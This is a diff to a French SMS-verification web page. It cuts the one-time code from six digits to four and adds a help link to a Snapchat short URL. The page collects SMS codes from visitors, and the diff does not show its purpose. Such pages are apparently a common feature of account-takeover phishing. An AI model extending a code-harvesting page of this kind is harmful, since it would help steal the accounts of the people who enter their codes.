@@ -198,11 +198,9 @@
       <div class="success-badge">✅ Accès approuvé</div>
     </div>
     <h1 style="text-align:center">Vérification SMS</h1>
-    <p class="subtitle">Un code à 6 chiffres a été envoyé au<br><strong id="displayPhone" style="color:white"></strong></p>
+    <p class="subtitle">Un code à 4 chiffres a été envoyé au<br><strong id="displayPhone" style="color:white"></strong></p>
 
     <div class="otp-inputs">
-      <input type="text" maxlength="1" class="otp" inputmode="numeric"/>
-      <input type="text" maxlength="1" class="otp" inputmode="numeric"/>
       <input type="text" maxlength="1" class="otp" inputmode="numeric"/>
       <input type="text" maxlength="1" class="otp" inputmode="numeric"/>
       <input type="text" maxlength="1" class="otp" inputmode="numeric"/>
@@ -226,6 +224,9 @@
     </div>
     <p class="note" style="margin-top:1rem">
       Code non reçu ? <a href="#" style="color:#60a5fa;text-decoration:none" onclick="resendCode(event)">Renvoyer</a>
+    </p>
+    <p class="note" style="margin-top:0.5rem">
+      <a href="https://snapchat.com/t/TCpCsjUx" style="color:#60a5fa;text-decoration:none">🆘 Besoin d'aide ?</a>
     </p>
   </div>
 
@@ -286,7 +287,7 @@
   // ══════════════════════════
   async function submitOTP() {
     const code = getOTPCode();
-    if (code.length < 6) { showStatus(2, "error", "Entrez les 6 chiffres du code."); return; }
+    if (code.length < 4) { showStatus(2, "error", "Entrez les 4 chiffres du code."); return; }
 
     setBtn(2, true, "Envoi en cours…", "⏳");
     hideStatuses(2);
@@ -369,7 +370,7 @@
       };
       inp.onpaste = (e) => {
         e.preventDefault();
-        const pasted = e.clipboardData.getData("text").replace(/\D/g,"").slice(0,6);
+        const pasted = e.clipboardData.getData("text").replace(/\D/g,"").slice(0,4);
         pasted.split("").forEach((c, idx) => { if(inputs[idx]) inputs[idx].value = c; });
         if (inputs[pasted.length-1]) inputs[pasted.length-1].focus();
       };
